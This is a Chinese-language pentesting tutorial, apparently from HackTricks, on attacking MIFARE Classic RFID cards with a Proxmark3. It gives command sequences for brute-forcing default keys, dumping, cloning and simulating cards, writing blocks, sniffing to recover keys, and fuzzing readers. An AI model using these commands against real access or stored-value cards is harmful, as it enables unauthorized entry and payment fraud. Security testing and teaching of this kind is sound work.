# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## 使用 Proxmark3 攻击 RFID 系统

安装 actively maintained 的 RRG/Iceman Proxmark3 client 和匹配的 firmware，然后根据该版本确认命令语法，因为下面显示的旧命令可能已发生变化。<sup>[[1]](#references)[[5]](#references)</sup>

### 攻击 MIFARE Classic 1KB

MIFARE Classic 1K 有 **16 个扇区**，每个扇区包含 **4 个块**，每块 **16 字节**。Manufacturer block 0 包含 UID/制造商数据，在正版 NXP 卡上为只读；特殊的克隆卡或“magic”卡可能允许重写该块。<sup>[[1]](#references)[[2]](#references)</sup>\
要访问每个扇区，需要 **2 个密钥**（**A** 和 **B**），它们存储在**每个扇区的块 3** 中（sector trailer）。sector trailer 还存储 **access bits**，用于规定使用这 2 个密钥对**每个块**的**读写**权限。\
例如，如果知道第一个密钥，可用它授予读取权限；如果知道第二个密钥，则可用它授予写入权限。

可以执行几种攻击方式。

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 还可以执行其他操作，例如对 **Tag to Reader communication** 进行 **eavesdropping**，以尝试查找敏感数据。对于这张卡，你可以直接嗅探通信并计算出所用密钥，因为其使用的 **cryptographic operations 较弱**，只要知道明文和密文就能计算出来（`mfkey64` 工具）。<sup>[[3]](#references)</sup>

#### MiFare Classic 储值卡滥用快速流程

有关密钥恢复、余额差异分析、完整性字段和 UID 克隆流程（包括 Proxmark3 客户端记录和 magic-card 的限制），请参阅 [MiFare Classic 离线储值篡改](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1)。

### 原始命令

IoT 系统有时会使用**非品牌或非商业标签**。此时，你可以使用 Proxmark3 向**标签发送自定义原始命令**。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

利用这些信息，你可以尝试搜索有关该卡及其通信方式的信息。Proxmark3 可以发送原始命令，例如：`hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 软件预装了一组**自动化脚本**，可用于执行简单任务。使用 `script list` 命令可查看完整列表。然后，使用 `script run` 命令并指定脚本名称：

```
proxmark3> script run mfkeys
```

你可以编写脚本来对 **tag readers** 进行 **fuzz**：复制一张**有效卡片**的数据，然后只需编写一个 **Lua script**，随机修改一个或多个随机 **bytes**，并检查每次迭代时**读卡器是否会崩溃**。

## References

- [1] [Proxmark3 wiki：HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki：HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP 关于 MIFARE Classic Crypto1 的声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value 中的 NFC 卡漏洞利用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux 安装](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
